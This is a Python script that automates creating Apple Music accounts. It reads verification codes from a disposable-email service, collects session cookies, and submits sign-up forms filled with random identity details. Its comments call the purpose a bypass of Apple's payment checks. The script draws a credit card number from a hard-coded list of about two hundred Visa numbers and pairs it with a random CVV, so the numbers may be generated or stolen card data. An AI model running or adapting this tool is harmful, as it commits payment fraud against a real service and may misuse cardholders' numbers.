import requests
import re
import random
import string
import time

#tempr.email
def readotp(email):
	i=str(email)
	readurl="https://www.1secmail.com/api/v1/?action=getMessages&login="+str(i)+"&domain=kzccv.com" #getting read
	readb=requests.get(readurl)
	iddd=readb.text[7:15]
	udurl="https://www.1secmail.com/api/v1/?action=readMessage&login="+str(i)+"&domain=kzccv.com&id="+str(iddd) #getting id
	readc=requests.get(udurl)
	rsd=readc.text
	otp=rsd[12139:12145]
	print(otp)
	return otp

cc=random.choice(["4016583708116560",
"4016585757734300",
"4016582056327860",
"4016585804266017",
"4016588000547800",
"4016583128725701",
"4016586863418101",
"4016584630254685",
"4016581426252154",
"4016588616463418",
"4016587030005482",
"4016588844087641",
"4016584548680468",
"4016581887504515",
"4016581023732236",
"4016585164084521",
"4016584302055543",
"4016587373876200",
"4016583248762311",
"4016584672487110",
"4016580044832454",
"4016585804784852",
"4016586105478681",
"4016581248258876",
"4016585421665187",
"4016580343236472",
"4016585667644003",
"4016584636873306",
"4016588544586181",
"4016586123013742",
"4016584286563025",
"4016583062020762",
"4016584008040880",
"4016586416541300",
"4016584368806524",
"4016580065242765",
"4016588830230031",
"4016586350005056",
"4016588772235865",
"4016583725845381",
"4016581765374163",
"4016584825513606",
"4016588418624654",
"4016582117612441",
"4016581701116058",
"4016581164650338",
"4016586804362681",
"4016585062538321",
"4016584836447075",
"4016581756852433",
"4016580002862048",
"4016581672136671",
"4016583783751604",
"4016580381136501",
"4016585704127384",
"4016586227360437",
"4016582750660541",
"4016581162510872",
"4016586216872731",
"4016585684722485",
"4016580233647150",
"4016580880444380",
"4016580135027311",
"4016581260811685",
"4016588433551544",
"4016580487431764",
"4016585484311042",
"4016581345301504",
"4016580622861123",
"4016583865580541",
"4016583651002270",
"4016580460513687",
"4016586813851674",
"4016585777505243",
"4016587755552437",
"4016588847605571",
"4016588220620478",
"4016580068263867",
"4016586107557888",
"4016588453802066",
"4016588311366130",
"4016581281845753",
"4016588048132318",
"4016587245712013",
"4016584240687738",
"4016585401446103",
"4016588328076664",
"4016583882336174",
"4016582074245185",
"4016582650502116",
"4016588082183128",
"4016588481782330",
"4016582627162523",
"4016584310533788",
"4016581073604830",
"4016584555318267",
"4016584531467766",
"4016580801338158",
"4016587564882728",
"4016583337766066",
"4016588032130344",
"4016584676614826",
"4016581042443286",
"4016585436018224",
"4016584566106602",
"4016581516482125",
"4016584420871110",
"4016587440804524",
"4016583175442663",
"4016584536234708",
"4016586077887885",
"4016580530451637",
"4016581677418843",
"4016585175202831",
"4016584878721668",
"4016588460433574",
"4016581701582135",
"4016587245614342",
"4016582484287157",
"4016586154005286",
"4016581774730504",
"4016580776586831",
"4016585080143740",
"4016581724605665",
"4016583222228354",
"4016587133027417",
"4016586780285203",
"4016582788644723",
"4016580843822433",
"4016587705108108",
"4016586370571616",
"4016587305383085",
"4016582707762416",
"4016588384167258",
"4016588306036367",
"4016580848422155",
"4016581752722622",
"4016581570321268",
"4016581277560804",
"4016587521755835",
"4016586417130236",
"4016581528041612",
"4016584668152603",
"4016584038608060",
"4016588061124481",
"4016588181333582",
"4016586568250874",
"4016581218610627",
"4016588643030230",
"4016582027754812",
"4016587261005748",
"4016580451882471",
"4016581104812634",
"4016588215487743",
"4016586454514722",
"4016583672383410",
"4016588560185454",
"4016580725588474",
"4016584364477247",
"4016585705815045",
"4016588464488228",
"4016588460462177",
"4016586484031036",
"4016585125886816",
"4016580072035772",
"4016585520420542",
"4016580123770831",
"4016580573817041",
"4016585875880001",
"4016588240842367",
"4016582126025361",
"4016580467343054",
"4016585863478586",
"4016583600336555",
"4016588783468612",
"4016584451822768",
"4016586835613433",
"4016580814825134",
"4016586266030461",
"4016588325525226",
"4016580785221180",
"4016586526017365",
"4016584230678044",
"4016580571622203",
"4016588812071304",
"4016583205418071",
"4016580061358847",
"4016581447448781",
"4016586260110681",
"4016580128308785",
"4016581477858404",
"4016585133812051",
"4016588220307860",
"4016586678618374",
"4016586683603874",
"4016588706528575",
"4016581202521343",
"4016584667475260",
"4016587832206643",
"4016587625043104",
])

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

email=get_random_string(10)
#email="mj8z9u6zgx"
newemail=str(email)+"@kzccv.com"
#newemail=str(email)+"@mowgli.jungleheart.com"  for diffrent email
firstname=get_random_string(7)
lastname=get_random_string(5)
addres=get_random_string(12)
bdday=random.randrange(10,28)
bdmonth=random.choice([10,11,12])
bdyear=random.randrange(1985,2002)
#zip1=str(100)+str(random.randrange(10,99))
zip1=10087
passwd=get_random_string(3)+"dSaadb#@12sx3"
phone=random.randrange(1111111,9999999)
cvv=random.randrange(111,999)
cyear=str(20)+str(random.randrange(22,28))
cmonth=random.choice([10,11,12])
card=cc
print("email is :"+ newemail)
print("passwd is :"+passwd)
#print(cc)
#print(firstname)
#print(lastname)
#print(addres)
#print(bdday)
#print(bdmonth)
#print(bdyear)
#print(zip1)
#print(phone)
print("cvv is :"+str(cvv))
#print(cyear)
#print(cmonth)

#to get nsmncookie
burp0_urla = "https://buy.music.apple.com:443/WebObjects/MZFinance.woa/wa/validateAccountFieldsSrv"
burp0_headersa = {"User-Agent": "", "Accept": "*/*", "Accept-Language": "en-us", "Accept-Encoding": "gzip, deflate", "Referer": "https://beta.music.apple.com/", "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "X-Apple-Store-Front": "143441-1,8", "Origin": "https://beta.music.apple.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
aaa=requests.post(burp0_urla, headers=burp0_headersa)
nsmnf=aaa.headers.get("Set-Cookie")
x=nsmnf[275:324]
print("ns-mzf-inst cookie ="+x)
cokk=(re.search("zf-inst=.*; v", nsmnf).group(0))
ss=(cokk[12:])
nsmncookie=ss.strip('; v')

#to get wosid
burp0_url22 = "https://buy.music.apple.com:443/account/restricted/create/options"
burp0_cookies22 = {"itspod": "25","wosid-lite": "","ns-mzf-inst": "","mzf_in": "3250170","dssid2":"0", "dssf":"1", "pxro":"1", "itspod":"25", "pvir":"0", "POD":"us~en", "accs":"o", "searchTermState":"0", "XID":"0", "xp_cci":"0", "as_sfa":"0", "s_vi":"0", "dslang":"GB-EN", "site":"GBR", "geo":"IN", "ndcd":"0"}
burp0_headers22 = {"User-Agent": "xx", "Accept": "*/*", "Accept-Language": "en-us", "Accept-Encoding": "gzip, deflate/", "Content-Type": "application/json"}
x1=requests.get(burp0_url22, headers=burp0_headers22, cookies=burp0_cookies22)
x2=x1.headers.get("Set-Cookie")
burp0_cookies22['wosid-lite']=x2[11:33]
burp0_cookies22['ns-mzf-inst']=nsmncookie
print(burp0_cookies22)

#o genrate code
burp0_url = "https://buy.music.apple.com:443/WebObjects/MZFinance.woa/wa/generateEmailConfirmationCodeSrv"
burp0_cookies = burp0_cookies22
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept": "*/*", "Accept-Language": "en-us", "Accept-Encoding": "gzip, deflate", "Referer": "https://beta.music.apple.com/", "Content-Type": "application/json", "X-Apple-Store-Front": "143441-1,8", "Origin": "https://beta.music.apple.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
burp0_json={"email": newemail}
a=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
clientoken=a.text[16:94]
print("clienttoken="+clientoken)
time.sleep(4)
#to read otp from tempmail
ooottp=readotp(email)
print("otp is" +str(ooottp))

#otp=input("Enter otp :")
otp=ooottp

#to verify email code 
burp0_url1 = "https://buy.music.apple.com:443/WebObjects/MZFinance.woa/wa/validateEmailConfirmationCodeSrv"
burp0_headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept": "*/*", "Accept-Language": "en-us", "Accept-Encoding": "gzip, deflate", "Referer": "https://beta.music.apple.com/", "Content-Type": "application/json", "X-Apple-Store-Front": "143441-1,8", "Origin": "https://beta.music.apple.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
burp0_json1={"clientToken": str(clientoken), "email": newemail, "secretCode": str(otp)}
b=requests.post(burp0_url1, headers=burp0_headers1, cookies=burp0_cookies, json=burp0_json1)
l1=b.text
l2=(re.search("UUID.*=", l1).group(0))
l3=(l2[7:])
l4=l3.strip('=')
pageuuid=str(l4)+"%3D"
if "status\":0" in b.text:
	print("Step=2 completed")

#to add dummy/fake cc, and dummy details of users to bypass payment gateway
print("Executing step-3 to bypass apple payments")
burp0_url2 = "https://buy.music.apple.com:443/WebObjects/MZFinance.woa/wa/createAccountSrv"
burp0_cookies2 = burp0_cookies
burp0_headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept": "*/*", "Accept-Language": "en-us", "Accept-Encoding": "gzip, deflate", "Referer": "https://beta.music.apple.com/", "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "X-Apple-Store-Front": "143441-1,8", "Origin": "https://beta.music.apple.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
burp0_data2 = {"storefront": "USA", "context": "create", "firstName": firstname, "lastName": lastname, "birthDay": bdday, "birthMonth": bdmonth, "birthYear": bdyear, "acAccountName": newemail, "acAccountPassword": passwd, "billingFirstName": firstname, "billingLastName": lastname, "addressOfficialLineFirst": addres, "addressOfficialCity": "ny", "addressOfficialStateProvince": "NY", "addressOfficialPostalCode": zip1, "addressOfficialCountryCode": "USA", "phoneOfficeNumber": phone, "paymentMethodType": "CreditCard", "creditCardType": "Visa", "creditCardNumber": card, "creditCardExpirationMonth": cmonth, "creditCardExpirationYear": cyear, "creditVerificationNumber": cvv, "pageUUID": str(pageuuid), "agreedToTerms": "1", "accountType": "email", "email": newemail, "phoneOfficeAreaCode": "312", "secretCode": str(otp), "clientToken": str(clientoken), "webCreate": "true"}
c=requests.post(burp0_url2, headers=burp0_headers2, cookies=burp0_cookies2, data=burp0_data2)
print(c.text)
if "accountId" in c.text:
	print("Account creaation completed")
